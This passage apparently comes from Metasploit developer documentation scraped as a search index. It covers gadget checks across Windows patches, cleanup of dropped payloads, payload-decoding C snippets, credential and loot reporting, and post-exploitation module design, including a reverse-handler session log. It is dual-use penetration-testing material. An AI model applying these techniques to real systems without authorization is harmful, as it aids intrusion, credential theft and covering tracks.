Windows 7 Internet Explorer And then I sort by date from September 2012 to 2014, I get: 22 results. But of course, this number will go up because IE 10 is still supported. There are also other desktop or command-line tools that will basically check missing patches for your Windows system, such as Windows Update Powershell Module , in some cases this may work better.","title":"How to collect Microsoft patches"},{"location":"dev/dark/How-to-check-Microsoft-patch-levels-for-your-exploit/#patch-extraction","text":"Old patches used to be packaged as EXEs, and this kind can be extracted by using decompression tools such as 7zip . Internet Explorer 6 patches, for example, can be extracted this way. Newer patches packaged as EXEs support the /X flag for extraction. For example, the following will extract the patch under the same directory. Patches such as Internet Explorer 8 (for XP) can be extracted this way. Windows[Something]-KB[Something]-x86-ENU.exe /X:. Most patches nowadays are packaged as MSUs. Here's what you have to do: Put all your *.msu files under the same directory (in Windows) Run tools/extract_msu.bat [absolute directory path to *.msu files) extract_msu.bat should automatically extract all the *.msu files. The \"extracted\" sub-directory in each new folder is where you can find the updated components. Note: The update folders might be labeled as GDR or QRE. GDR indicates Generation Distribution Release, while QRE means Quick Fix Engineering.","title":"Patch extraction"},{"location":"dev/dark/How-to-check-Microsoft-patch-levels-for-your-exploit/#checking-gadgets-in-patches","text":"The quickest way to check gadgets across different patches is by using Metasploit's msfpescan utility (or msfbinscan, which is smart enough to know it's PE format). It's really easy, all you have to do is put the DLLs in the same directory, and then do: $ ./msfbinscan -D -a [address] -A 10 /patches/*.dll What that does is the tool will disassemble all the DLLs under that directory, at that specific address for 10 bytes. You can probably automate a little more to quickly identify which DLLs don't have right gadget, and if that's the case for you, that means the gadget you're using is unsafe. You should find another one that's more reliable.","title":"Checking gadgets in patches"},{"location":"dev/dark/How-to-clean-up-files-using-FileDropper/","text":"In some exploitation scenarios such as local privilege escalation, command execution, write privilege attacks, SQL Injections, etc, it is very likely that you have to upload one or more malicious files in order to gain control of the target machine. Well, a smart attacker shouldn't leave anything behind, so if a module needs to drop something onto the file system, it's important to remove it right after the purpose is served. And that is why we created the FileDropper mixin. Examples The FileDropper mixin is a file manager that allows you keep track of files, and then delete them when a session is created. To use it, first include the mixin like so: include Msf :: Exploit :: FileDropper Next, tell the FileDropper mixin where the file is going to be after a session is created by using the register_file_for_cleanup method. Each file name should either be a full path, or relative to the current working directory of the session. For example, if I want to upload a payload to the target machine's remote path: C:\\Windows\\System32\\payload.exe , then my statement can be: register_file_for_cleanup ( \"C: \\\\ Windows \\\\ System32 \\\\ payload.exe\" ) If my session's current directory is already in C:\\Windows\\System32\\ , then I can simply do: register_file_for_cleanup ( \"payload.exe\" ) If you wish to register multiple files, you can also provide the file names as arguments: register_file_for_cleanup ( \"file_1.vbs\" , \"file_2.exe\" , \"file_1.conf\" ) Note that if your exploit module uses on_new_session , you are actually overriding FileDropper's on_new_session . Reference https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/file_dropper.rb","title":"How to clean up files using FileDropper"},{"location":"dev/dark/How-to-clean-up-files-using-FileDropper/#examples","text":"The FileDropper mixin is a file manager that allows you keep track of files, and then delete them when a session is created. To use it, first include the mixin like so: include Msf :: Exploit :: FileDropper Next, tell the FileDropper mixin where the file is going to be after a session is created by using the register_file_for_cleanup method. Each file name should either be a full path, or relative to the current working directory of the session. For example, if I want to upload a payload to the target machine's remote path: C:\\Windows\\System32\\payload.exe , then my statement can be: register_file_for_cleanup ( \"C: \\\\ Windows \\\\ System32 \\\\ payload.exe\" ) If my session's current directory is already in C:\\Windows\\System32\\ , then I can simply do: register_file_for_cleanup ( \"payload.exe\" ) If you wish to register multiple files, you can also provide the file names as arguments: register_file_for_cleanup ( \"file_1.vbs\" , \"file_2.exe\" , \"file_1.conf\" ) Note that if your exploit module uses on_new_session , you are actually overriding FileDropper's on_new_session .","title":"Examples"},{"location":"dev/dark/How-to-clean-up-files-using-FileDropper/#reference","text":"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/file_dropper.rb","title":"Reference"},{"location":"dev/dark/How-to-decode-Base64-with-Metasploit-Framework-Compiler/","text":"Description How to decode Base64 with Metasploit::Framework::Compiler The Metasploit C compiler has built-in support for Base64 encoding and decoding, which is implemented as base64.h . Code Example #include <Windows.h> #include <String.h> #include <base64.h> // \"Hello World\" encoded by Rex::Text.encode_base64() #define BASE64STR \"aGVsbG8gd29ybGQ=\" int main () { int base64StrLen = strlen ( BASE64STR ); LPVOID lpBuf = VirtualAlloc ( NULL , sizeof ( int ) * base64StrLen , MEM_COMMIT , PAGE_EXECUTE_READWRITE ); memset ( lpBuf , '\\0' , base64StrLen ); base64decode ( lpBuf , BASE64STR , base64StrLen ); MessageBox ( NULL , ( char * ) lpBuf , \"Base64 Test\" , MB_OK ); return 0 ; } To compile, use How to use Metasploit::Framework::Compiler::Windows to compile C code","title":"Description"},{"location":"dev/dark/How-to-decode-Base64-with-Metasploit-Framework-Compiler/#description","text":"","title":"Description"},{"location":"dev/dark/How-to-decode-Base64-with-Metasploit-Framework-Compiler/#how-to-decode-base64-with-metasploitframeworkcompiler","text":"The Metasploit C compiler has built-in support for Base64 encoding and decoding, which is implemented as base64.h .","title":"How to decode Base64 with Metasploit::Framework::Compiler"},{"location":"dev/dark/How-to-decode-Base64-with-Metasploit-Framework-Compiler/#code-example","text":"#include <Windows.h> #include <String.h> #include <base64.h> // \"Hello World\" encoded by Rex::Text.encode_base64() #define BASE64STR \"aGVsbG8gd29ybGQ=\" int main () { int base64StrLen = strlen ( BASE64STR ); LPVOID lpBuf = VirtualAlloc ( NULL , sizeof ( int ) * base64StrLen , MEM_COMMIT , PAGE_EXECUTE_READWRITE ); memset ( lpBuf , '\\0' , base64StrLen ); base64decode ( lpBuf , BASE64STR , base64StrLen ); MessageBox ( NULL , ( char * ) lpBuf , \"Base64 Test\" , MB_OK ); return 0 ; } To compile, use How to use Metasploit::Framework::Compiler::Windows to compile C code","title":"Code Example"},{"location":"dev/dark/How-to-decrypt-RC4-with-Metasploit-Framework-Compiler/","text":"How to decrypt RC4 with Metasploit::Framework::Compiler The Metasploit C compiler has built-in support for RC4 encryption and decryption, which is implemented as the rc4.h header. Code Example #include <Windows.h> #include <rc4.h> #define PAYLOADSIZE 12 #define RC4KEY \"4ASMkFslyhwXehNZw048cF1Vh1ACzyyA\" int main ( void ) { unsigned char payload [] = \" \\xd8\\xb0\\xe9\\x5a\\x89\\xc2\\xee\\x43\\xb9\\x30\\xd0\\x86 \" ; int lpBufSize = sizeof ( int ) * PAYLOADSIZE ; LPVOID lpBuf = VirtualAlloc ( NULL , lpBufSize , MEM_COMMIT , 0x04 ); memset ( lpBuf , '\\0' , lpBufSize ); RC4 ( RC4KEY , payload , ( char * ) lpBuf , PAYLOADSIZE ); MessageBox ( NULL , ( char * ) lpBuf , \"Test\" , MB_OK ); return 0 ; } To compile, use Metasploit::Framework::Compiler::Windows.compile_c .","title":"How to decrypt RC4 with Metasploit::Framework::Compiler"},{"location":"dev/dark/How-to-decrypt-RC4-with-Metasploit-Framework-Compiler/#how-to-decrypt-rc4-with-metasploitframeworkcompiler","text":"The Metasploit C compiler has built-in support for RC4 encryption and decryption, which is implemented as the rc4.h header.","title":"How to decrypt RC4 with Metasploit::Framework::Compiler"},{"location":"dev/dark/How-to-decrypt-RC4-with-Metasploit-Framework-Compiler/#code-example","text":"#include <Windows.h> #include <rc4.h> #define PAYLOADSIZE 12 #define RC4KEY \"4ASMkFslyhwXehNZw048cF1Vh1ACzyyA\" int main ( void ) { unsigned char payload [] = \" \\xd8\\xb0\\xe9\\x5a\\x89\\xc2\\xee\\x43\\xb9\\x30\\xd0\\x86 \" ; int lpBufSize = sizeof ( int ) * PAYLOADSIZE ; LPVOID lpBuf = VirtualAlloc ( NULL , lpBufSize , MEM_COMMIT , 0x04 ); memset ( lpBuf , '\\0' , lpBufSize ); RC4 ( RC4KEY , payload , ( char * ) lpBuf , PAYLOADSIZE ); MessageBox ( NULL , ( char * ) lpBuf , \"Test\" , MB_OK ); return 0 ; } To compile, use Metasploit::Framework::Compiler::Windows.compile_c .","title":"Code Example"},{"location":"dev/dark/How-to-deprecate-a-Metasploit-module/","text":"Metasploit has a very specific way to deprecate a module. To do so, you must be using the Msf::Module::Deprecated mixin. The reason you must be using this mixin is because two things: You are required to set a deprecation date. That way we know when to remove it, which is done manually. You are required to set a replacement of the module you wish to deprecate. Usage To use the Msf::Module::Deprecated , here's how: 1 - Under class MetasploitModule of your module, include the following: include Msf :: Module :: Deprecated 2a - Use the deprecated method to assign a deprecation date and replacement module: deprecated ( Date . new ( 2014 , 9 , 21 ), 'exploit/linux/http/dlink_upnp_exec_noauth' ) 2b - Alternatively, define the DEPRECATION_DATE and DEPRECATION_REPLACEMENT constants: DEPRECATION_DATE = Date . new ( 2014 , 9 , 21 ) # Sep 21 # The new module is exploit/linux/http/dlink_upnp_exec_noauth DEPRECATION_REPLACEMENT = 'exploit/linux/http/dlink_upnp_exec_noauth' When the user loads that module, they should see a warning like this: msf > use exploit/windows/misc/test [!] ************************************************************************ [!] * The module windows/misc/test is deprecated! * [!] * It will be removed on or about 2014-09-21 * [!] * Use exploit/linux/http/dlink_upnp_exec_noauth instead * [!] ************************************************************************ Code example require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Module :: Deprecated deprecated ( Date . new ( 2014 , 9 , 21 ), 'exploit/linux/http/dlink_upnp_exec_noauth' ) def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Msf::Module::Deprecated Example' , 'Description' => %q{ This shows how to use Msf::Module::Deprecated. } , 'Author' => [ 'sinn3r' ] , 'License' => MSF_LICENSE , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'DisclosureDate' => 'Apr 01 2014' , 'Targets' => [ [ 'Automatic' , { } ] ] , 'DefaultTarget' => 0 )) end def exploit print_debug ( \"Code example\" ) end end","title":"How to deprecate a Metasploit module"},{"location":"dev/dark/How-to-deprecate-a-Metasploit-module/#usage","text":"To use the Msf::Module::Deprecated , here's how: 1 - Under class MetasploitModule of your module, include the following: include Msf :: Module :: Deprecated 2a - Use the deprecated method to assign a deprecation date and replacement module: deprecated ( Date . new ( 2014 , 9 , 21 ), 'exploit/linux/http/dlink_upnp_exec_noauth' ) 2b - Alternatively, define the DEPRECATION_DATE and DEPRECATION_REPLACEMENT constants: DEPRECATION_DATE = Date . new ( 2014 , 9 , 21 ) # Sep 21 # The new module is exploit/linux/http/dlink_upnp_exec_noauth DEPRECATION_REPLACEMENT = 'exploit/linux/http/dlink_upnp_exec_noauth' When the user loads that module, they should see a warning like this: msf > use exploit/windows/misc/test [!] ************************************************************************ [!] * The module windows/misc/test is deprecated! * [!] * It will be removed on or about 2014-09-21 * [!] * Use exploit/linux/http/dlink_upnp_exec_noauth instead * [!] ************************************************************************","title":"Usage"},{"location":"dev/dark/How-to-deprecate-a-Metasploit-module/#code-example","text":"require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Module :: Deprecated deprecated ( Date . new ( 2014 , 9 , 21 ), 'exploit/linux/http/dlink_upnp_exec_noauth' ) def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Msf::Module::Deprecated Example' , 'Description' => %q{ This shows how to use Msf::Module::Deprecated. } , 'Author' => [ 'sinn3r' ] , 'License' => MSF_LICENSE , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'DisclosureDate' => 'Apr 01 2014' , 'Targets' => [ [ 'Automatic' , { } ] ] , 'DefaultTarget' => 0 )) end def exploit print_debug ( \"Code example\" ) end end","title":"Code example"},{"location":"dev/dark/How-to-do-reporting-or-store-data-in-module-development/","text":"store_loot() - Used to store both stolen files (both text and binary) and \"screencaps\" of commands such as a ps -ef and ifconfig . The file itself need not be of forensic-level integrity -- they may be parsed by a post module to extract only the relevant information for a penetration tester. report_auth_info() - Used to store working credentials that are immediately reusable by another module. For example, a module dumping the local SMB hashes would use this, as would a module which reads username:password combinations for a specific host and service. Specifically, merely \"likely\" usernames and passwords should use store_loot() instead. report_vuln() - Auxiliary and post modules that exercise a particular vulnerability should report_vuln() upon success. Note that exploit modules automatically report_vuln() as part of opening a session (there is no need to call it especially). report_note() - Modules should make an effort to avoid report_note() when one of the above methods would be a better fit, but there are often cases where \"loot\" or \"cred\" or \"vuln\" classifications are not immediately appropriate. report_note() calls should always set a OID-style dotted :type, such as domain.hosts, so other modules may easily find them in the database. report_host() - Reports a host's liveness and attributes such as operating system and service pack. This is less common because other reporting methods already do this, such as report_service , report_exploit_success , report_client , report_note , report_host_tag , report_vuln , report_event , report_loot , etc. Try not to repeat it. report_service() - Reports a new service (port) that's been detected by your module. report_client() - Reports a client running a host, such as a web browser. report_web_site() - Reports a website, and must be tied to an existing :service . If there is no :service , you will have to supply :host , :port , :ssl . report_web_page() - You can use this if your module discovers a webpage that look interesting. report_web_form() - You can use this if your module discovers web forms that look interesting. report_web_vuln() - Reports a web application vulnerability. Exploits don't really need to use this. It's more suitable for auxiliary modules that exploit a bug that determines that it is vulnerable. report_loot() - Very rarely, modules might actually want to export loots without using store_loot(). Typically they do this with Ruby's file IO, but this won't be logged in the database so can't be tracked by Metasploit Framework. In that case, a report_loot() is needed. However, 99.9% of the time you should be using store_loot() . References https://github.com/rapid7/metasploit-framework/wiki/Guidelines-for-Accepting-Modules-and-Enhancements https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/db.rb","title":"How to do reporting or store data in module development"},{"location":"dev/dark/How-to-do-reporting-or-store-data-in-module-development/#references","text":"https://github.com/rapid7/metasploit-framework/wiki/Guidelines-for-Accepting-Modules-and-Enhancements https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/db.rb","title":"References"},{"location":"dev/dark/How-to-get-Oracle-Support-working-with-Kali-Linux/","text":"This is an update of the original blog post about how to get Oracle support working with Metasploit and Kali Linux, found here: http://leonjza.github.io/blog/2014/08/17/kali-linux-oracle-support/ Due to licensing issues, we cannot ship Oracle's proprietary client access libraries by default. As a result, you may see this error when running a Metasploit module: msf auxiliary(oracle_login) > run [-] Failed to load the OCI library: cannot load such file -- oci8 [-] See http://www.metasploit.com/redmine/projects/framework/wiki/OracleUsage for installation instructions [*] Auxiliary module execution completed msf auxiliary(oracle_login) > run The general steps to getting Oracle support working are to install the Oracle Instant Client and development libraries, install the required dependencies for Kali Linux, then install the gem. Install the Oracle Instant Client As root, create the directory /opt/oracle . Then download the Oracle Instant Client packages for your version of Kali Linux. The packages you will need are: instantclient-basic-linux-12.2.0.1.0.zip instantclient-sqlplus-linux-12.2.0.1.0.zip instantclient-sdk-linux-12.2.0.1.0.zip Unzip these under /opt/oracle , and you should now have a path called /opt/oracle/instantclient_12_2/ . Next symlink the shared library that we need to access the library from oracle: root@kali:/opt/oracle/instantclient_12_2# ln libclntsh.so.12.1 libclntsh.so root@kali:/opt/oracle/instantclient_12_2# ls -lh libclntsh.so lrwxrwxrwx 1 root root 17 Jun 1 15:41 libclntsh.so -> libclntsh.so.12.1 You also need to configure the appropriate environment variables, perhaps by inserting them into your .bashrc file, logging out and back in for them to apply. export PATH=$PATH:/opt/oracle/instantclient_12_2 export SQLPATH=/opt/oracle/instantclient_12_2 export TNS_ADMIN=/opt/oracle/instantclient_12_2 export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2 export ORACLE_HOME=/opt/oracle/instantclient_12_2 If you have succeeded, you should be able to run sqlplus from a command prompt: root@kali:/opt/oracle/instantclient_12_2# sqlplus SQL*Plus: Release 12.2.0.1.0 Production on Tue Mar 26 20:40:24 2019 Copyright (c) 1982, 2016, Oracle. All rights reserved. Enter user-name: Install the ruby gem First, download and extract the gem source release: root@kali:~# wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.2.7.zip --2019-03-26 20:31:11-- https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.2.7.zip Resolving github.com (github.com)... 192.30.253.113, 192.30.253.112 Connecting to github.com (github.com)|192.30.253.113|:443... connected. HTTP request sent, awaiting response... 302 Found Location: https://codeload.github.com/kubo/ruby-oci8/zip/ruby-oci8-2.2.7 [following] --2019-03-26 20:31:11-- https://codeload.github.com/kubo/ruby-oci8/zip/ruby-oci8-2.2.7 Resolving codeload.github.com (codeload.github.com)... 192.30.253.120, 192.30.253.121 Connecting to codeload.github.com (codeload.github.com)|192.30.253.120|:443... connected. HTTP request sent, awaiting response... 200 OK Length: unspecified [application/zip] Saving to: \u2018ruby-oci8-2.2.7.zip\u2019 ruby-oci8-2.2.7.zip [ <=> ] 376.97K 2.36MB/s in 0.2s 2019-03-26 20:31:11 (2.36 MB/s) - \u2018ruby-oci8-2.2.7.zip\u2019 saved [386016] root@kali:~# unzip ruby-oci8-2.2.7.zip Archive: ruby-oci8-2.2.7.zip 0c85bf6da2f541de3236267b1a1b18f0136a8f5a creating: ruby-oci8-ruby-oci8-2.2.7/ inflating: ruby-oci8-ruby-oci8-2.2.7/.gitignore inflating: ruby-oci8-ruby-oci8-2.2.7/.travis.yml [...] inflating: ruby-oci8-ruby-oci8-2.2.7/test/test_rowid.rb root@kali:~# cd ruby-oci8-ruby-oci8-2.2.7/ Install libgmp (needed to build the gem) and set the path to prefer the correct version of ruby so that Metasploit can use it. root@kali:~/ruby-oci8-ruby-oci8-2.2.7# export PATH=/opt/metasploit/ruby/bin:$PATH root@kali:~/ruby-oci8-ruby-oci8-2.2.7# apt-get install libgmp-dev Reading package lists... Done Building dependency tree Reading state information... Done Suggested packages: libgmp10-doc libmpfr-dev The following NEW packages will be installed: libgmp-dev 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 0 B/610 kB of archives. After this operation, 1,740 kB of additional disk space will be used. Selecting previously unselected package libgmp-dev:amd64. (Reading database ... 322643 files and directories currently installed.) Unpacking libgmp-dev:amd64 (from .../libgmp-dev_2%3a5.0.5+dfsg-2_amd64.deb) ... Setting up libgmp-dev:amd64 (2:5.0.5+dfsg-2) ... Build and install the gem root@kali:~/ruby-oci8-ruby-oci8-2.2.7# make ruby -w setup.rb config setup.rb:280: warning: assigned but unused variable - vname setup.rb:280: warning: assigned but unused variable - desc setup.rb:280: warning: assigned but unused variable - default2 ---> lib ---> lib/dbd <--- lib/dbd ---> lib/oci8 <--- lib/oci8 <--- lib ---> ext ---> ext/oci8 /opt/metasploit/ruby/bin/ruby /root/ruby-oci8-ruby-oci8-2.2.7/ext/oci8/extconf.rb checking for load library path... LD_LIBRARY_PATH... checking /opt/metasploit/ruby/lib... no checking /opt/oracle/instantclient_12_2... yes /opt/oracle/instantclient_12_2/libclntsh.so.12.1 looks like an instant client. checking for cc... ok checking for gcc... yes checking for LP64... yes checking for sys/types.h... yes checking for ruby header... ok checking for OCIInitialize() in oci.h... yes [...] linking shared-object oci8lib_250.so make[1]: Leaving directory `/root/ruby-oci8-ruby-oci8-2.2.7/ext/oci8' <--- ext/oci8 <--- ext root@kali:~/ruby-oci8-ruby-oci8-2.2.7# make install ruby -w setup.rb install setup.rb:280: warning: assigned but unused variable - vname setup.rb:280: warning: assigned but unused variable - desc setup.rb:280: warning: assigned but unused variable - default2 ---> lib mkdir -p /opt/metasploit/ruby/lib/ruby/site_ruby/2.5.0/ install oci8.rb /opt/metasploit/ruby/lib/ruby/site_ruby/2.5.0/ [...] <--- ext root@kali:~/ruby-oci8-ruby-oci8-2.2.7#","title":"How to get Oracle Support working with Kali Linux"},{"location":"dev/dark/How-to-get-Oracle-Support-working-with-Kali-Linux/#install-the-oracle-instant-client","text":"As root, create the directory /opt/oracle . Then download the Oracle Instant Client packages for your version of Kali Linux. The packages you will need are: instantclient-basic-linux-12.2.0.1.0.zip instantclient-sqlplus-linux-12.2.0.1.0.zip instantclient-sdk-linux-12.2.0.1.0.zip Unzip these under /opt/oracle , and you should now have a path called /opt/oracle/instantclient_12_2/ . Next symlink the shared library that we need to access the library from oracle: root@kali:/opt/oracle/instantclient_12_2# ln libclntsh.so.12.1 libclntsh.so root@kali:/opt/oracle/instantclient_12_2# ls -lh libclntsh.so lrwxrwxrwx 1 root root 17 Jun 1 15:41 libclntsh.so -> libclntsh.so.12.1 You also need to configure the appropriate environment variables, perhaps by inserting them into your .bashrc file, logging out and back in for them to apply. export PATH=$PATH:/opt/oracle/instantclient_12_2 export SQLPATH=/opt/oracle/instantclient_12_2 export TNS_ADMIN=/opt/oracle/instantclient_12_2 export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2 export ORACLE_HOME=/opt/oracle/instantclient_12_2 If you have succeeded, you should be able to run sqlplus from a command prompt: root@kali:/opt/oracle/instantclient_12_2# sqlplus SQL*Plus: Release 12.2.0.1.0 Production on Tue Mar 26 20:40:24 2019 Copyright (c) 1982, 2016, Oracle. All rights reserved. Enter user-name:","title":"Install the Oracle Instant Client"},{"location":"dev/dark/How-to-get-Oracle-Support-working-with-Kali-Linux/#install-the-ruby-gem","text":"First, download and extract the gem source release: root@kali:~# wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.2.7.zip --2019-03-26 20:31:11-- https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.2.7.zip Resolving github.com (github.com)... 192.30.253.113, 192.30.253.112 Connecting to github.com (github.com)|192.30.253.113|:443... connected. HTTP request sent, awaiting response... 302 Found Location: https://codeload.github.com/kubo/ruby-oci8/zip/ruby-oci8-2.2.7 [following] --2019-03-26 20:31:11-- https://codeload.github.com/kubo/ruby-oci8/zip/ruby-oci8-2.2.7 Resolving codeload.github.com (codeload.github.com)... 192.30.253.120, 192.30.253.121 Connecting to codeload.github.com (codeload.github.com)|192.30.253.120|:443... connected. HTTP request sent, awaiting response... 200 OK Length: unspecified [application/zip] Saving to: \u2018ruby-oci8-2.2.7.zip\u2019 ruby-oci8-2.2.7.zip [ <=> ] 376.97K 2.36MB/s in 0.2s 2019-03-26 20:31:11 (2.36 MB/s) - \u2018ruby-oci8-2.2.7.zip\u2019 saved [386016] root@kali:~# unzip ruby-oci8-2.2.7.zip Archive: ruby-oci8-2.2.7.zip 0c85bf6da2f541de3236267b1a1b18f0136a8f5a creating: ruby-oci8-ruby-oci8-2.2.7/ inflating: ruby-oci8-ruby-oci8-2.2.7/.gitignore inflating: ruby-oci8-ruby-oci8-2.2.7/.travis.yml [...] inflating: ruby-oci8-ruby-oci8-2.2.7/test/test_rowid.rb root@kali:~# cd ruby-oci8-ruby-oci8-2.2.7/ Install libgmp (needed to build the gem) and set the path to prefer the correct version of ruby so that Metasploit can use it. root@kali:~/ruby-oci8-ruby-oci8-2.2.7# export PATH=/opt/metasploit/ruby/bin:$PATH root@kali:~/ruby-oci8-ruby-oci8-2.2.7# apt-get install libgmp-dev Reading package lists... Done Building dependency tree Reading state information... Done Suggested packages: libgmp10-doc libmpfr-dev The following NEW packages will be installed: libgmp-dev 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 0 B/610 kB of archives. After this operation, 1,740 kB of additional disk space will be used. Selecting previously unselected package libgmp-dev:amd64. (Reading database ... 322643 files and directories currently installed.) Unpacking libgmp-dev:amd64 (from .../libgmp-dev_2%3a5.0.5+dfsg-2_amd64.deb) ... Setting up libgmp-dev:amd64 (2:5.0.5+dfsg-2) ... Build and install the gem root@kali:~/ruby-oci8-ruby-oci8-2.2.7# make ruby -w setup.rb config setup.rb:280: warning: assigned but unused variable - vname setup.rb:280: warning: assigned but unused variable - desc setup.rb:280: warning: assigned but unused variable - default2 ---> lib ---> lib/dbd <--- lib/dbd ---> lib/oci8 <--- lib/oci8 <--- lib ---> ext ---> ext/oci8 /opt/metasploit/ruby/bin/ruby /root/ruby-oci8-ruby-oci8-2.2.7/ext/oci8/extconf.rb checking for load library path... LD_LIBRARY_PATH... checking /opt/metasploit/ruby/lib... no checking /opt/oracle/instantclient_12_2... yes /opt/oracle/instantclient_12_2/libclntsh.so.12.1 looks like an instant client. checking for cc... ok checking for gcc... yes checking for LP64... yes checking for sys/types.h... yes checking for ruby header... ok checking for OCIInitialize() in oci.h... yes [...] linking shared-object oci8lib_250.so make[1]: Leaving directory `/root/ruby-oci8-ruby-oci8-2.2.7/ext/oci8' <--- ext/oci8 <--- ext root@kali:~/ruby-oci8-ruby-oci8-2.2.7# make install ruby -w setup.rb install setup.rb:280: warning: assigned but unused variable - vname setup.rb:280: warning: assigned but unused variable - desc setup.rb:280: warning: assigned but unused variable - default2 ---> lib mkdir -p /opt/metasploit/ruby/lib/ruby/site_ruby/2.5.0/ install oci8.rb /opt/metasploit/ruby/lib/ruby/site_ruby/2.5.0/ [...] <--- ext root@kali:~/ruby-oci8-ruby-oci8-2.2.7#","title":"Install the ruby gem"},{"location":"dev/dark/How-to-get-started-with-writing-a-Meterpreter-script/","text":"I tricked you. We don't let anybody write Meterpreter scripts anymore, therefore we will no longer teach you how. You should try writing post modules instead .","title":"How to get started with writing a Meterpreter script"},{"location":"dev/dark/How-to-get-started-with-writing-a-Meterpreter-script/#you-should-try-writing-post-modules-instead","text":"","title":"You should try writing post modules instead."},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/","text":"Post module development is a challenge to your programming skills. It's not like writing a memory corruption based exploit, where technically speaking is usually about crafting a malicious input - a string. A post module is more about proper module design, practical knowledge in Ruby and the Metasploit library. It's also a very valuable skill to have, because if you don't know what to do after popping a shell, what's the point of the penetration test, right? Also, what if a module doesn't work? Are you willing to wait days, weeks, or maybe even months for someone else to fix it for you? Probably not. If you know how to do it yourself, you can probably fix it a lot sooner, and continue with your pentest and do more things. So learn post module development! It's good for you, and your career. Plan your module Just like writing a software, before you start coding you should have a clear and specific goal for what your post module does. It's never a good idea to have multiple functionalities in a single module. For example: having it steal the network configuration files, steal passwd, hashes, shell history, etc. Instead, you should break it down into multiple modules. You should also think about what session types to support: meterpreter, or shell. Ideally, support both. But if you have to choose between the two, on Windows you should favor Windows Meterpreter. On Linux, the shell session type has been a stronger candidate than the Linux Meterpreter, but hopefully this will change in the near future. For platforms that don't have a Meterpreter, obviously your only choice is a shell. Another important thing is to think about how your module will perform on different distributions/systems. For example, say you want to run a ifconfig command on Linux. On Ubuntu it's a no-brainer, simply run the ifconfig command. Well, a different Linux distro might not actually know what you're asking, so you have to be more specific and do /sbin/ifconfig instead. Same thing with Windows. Is it C:\\WINDOWS\\ or C:\\WinNT ? It's both. Is it C:\\Documents and Settings\\[User name] , or C:\\Users\\[User name] ? Both, depends on that Windows version. A better solution to that would be use an environment variable :-) Always do your homework, and contain as many scenarios you can think of. And most importantly, get your VMs and TEST! Categories of post modules Post modules are categorized based on their behavior. For example, if it collects data, naturally it goes to the \"gather\" category. If it adds/updates/or removes an user, it belongs to \"manage\". Here's a list as a reference: Category Description gather Modules that involve data gathering/collecting/enumeration. gather/credentials Modules that steal credentials. gather/forensics Modules that involve forensics data gathering. manage Modules that modifies/operates/manipulates something on the system. Session management related tasks such as migration, injection also go here. recon Modules that will help you learn more about the system in terms of reconnaissance, but not about data stealing. Understand this is not the same as \"gather\" type modules. wlan Modules that are for WLAN related tasks. escalate This is deprecated, but the modules remain there due to popularity. This used to be the place for privilege escalation modules. All privilege escalation modules are no longer considered as post modules, they're now exploits. capture Modules that involve monitoring something for data collection. For example: key logging. Session object So you know how in Lord of the Rings, people are totally obsessed with the One Ring? Well, that's how it is with the session object. The one object you cannot live without, it's your precious. All post modules and other related mixins basically are built on top of the session object, because it knows everything about the compromised host, and allows you to command it. You can use the session method to access the session object, or its alias client . The best way to interact with one is via irb, here's an example of how: msf exploit(handler) > run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55157) at 2014-07-31 17:59:36 -0500 meterpreter > irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client >> session.class => Msf::Sessions::Meterpreter_x86_Win At this point you have the power to rule them all. But notice that the above example is a Msf::Sessions::Meterpreter_x86_Win object. There are actually several more different ones: command_shell.rb, meterpreter_php.rb, meterpreter_java.rb, meterpreter_x86_linux.rb, etc. Each behaves differently so it's actually kind of difficult to explain them all, but they are defined in the lib/msf/base/sessions/ directory so you can see how they work. Or you can play with one since you're already in the irb prompt. In Ruby, there are two object methods that are handy for debugging purposes. The first is methods , which will list all the public and protected methods from that object: session . methods The other one is inspect , which returns a string of a human-readable representation of the object: session . inspect You can also look at other current post modules and see how they use their session object. The Msf::Post Mixin As we explained, most post module mixins are built on top of the session object, and there are many out there. However, there is a main one you obviously cannot live without: the Msf::Post mixin. When you create a post module with this mixin, a lot of other mixins are also already included for all kinds of scenarios, to be more specific: msf/core/post/common - Common methods post modules use, for example: cmd_exec . msf/core/post_mixin - Keeps track of the session state. msf/core/post/file - File system related methods. msf/core/post/webrtc - Uses WebRTC to interact with the target machine's webcam. msf/core/post/linux - There actually isn't a lot going on, just get_sysinfo and is_root? specifically for Linux. msf/core/post/osx - get_sysinfo , get_users , get_system_accounts , get_groups , and methods for operating the target machine's webcam. msf/core/post/solaris - Pretty much like the linux mixin. Same methods, but for Solaris. msf/core/post/unix - get_users , get_groups , enum_user_directories msf/core/post/windows - Most of the development time are spent here. From Windows account management, event log, file info, Railgun, LDAP, netapi, powershell, registry, wmic, services, etc. Template Here we have a post module template. As you can see, there are some required fields that need to be filled. We'll explain each: ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule < Msf :: Post def initialize ( info = {}) super ( update_info ( info , 'Name' => '[Platform] [Module Category] [Software] [Function]' , 'Description' => %q{ Say something that the user might want to know. } , 'License' => MSF_LICENSE , 'Author' => [ 'Name' ] , 'Platform' => [ 'win' , 'linux' , 